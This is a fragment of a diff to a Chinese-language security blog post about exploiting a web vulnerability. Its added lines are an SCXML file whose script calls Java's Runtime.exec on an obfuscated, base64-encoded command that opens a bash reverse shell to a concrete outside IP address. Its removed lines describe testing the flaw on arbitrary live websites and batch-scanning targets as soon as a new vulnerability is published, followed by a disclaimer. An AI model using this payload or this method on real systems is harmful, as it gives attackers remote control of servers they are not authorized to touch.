+<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0" initial="run">
+        <state id="run">
+                <onentry>
+                        <script>
+                                ''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjIyLjE5NS8yMzMzIDA+JjEK}|{base64,-d}|{bash,-i}')
+                        </script>
+                </onentry>
+        </state>
+</scxml>
+                         
+```
 
 
 
-利用的效果
 
-![image-20241018141059995](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141059995.png)
 
-然后我们可以随便找个网址验证一下
+![image-20240912223944361](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912223944361.png)
 
-进入网址效果如下，说明网址还在正常使用的
 
-![image-20241018141225997](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141225997.png)
-
-然后测试漏洞
-
-![image-20241018141631256](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141631256.png)
-
-可以看见漏洞是存在的
-
-然后就是查权重了
-
-![image-20241018141830224](https://gitee.com/nn0nkey/picture/raw/master/img/image-20241018141830224.png)
-
-这个可以一把梭哈的
-
-## 最后
-
-这种挖掘方式需要我们抓住时机,需要我们在day刚出来的时候就去开始批量扫描，如果自己会代码审计的话那就很不错了
-
-**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。**
+![image-20240912224002564](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912224002564.png)
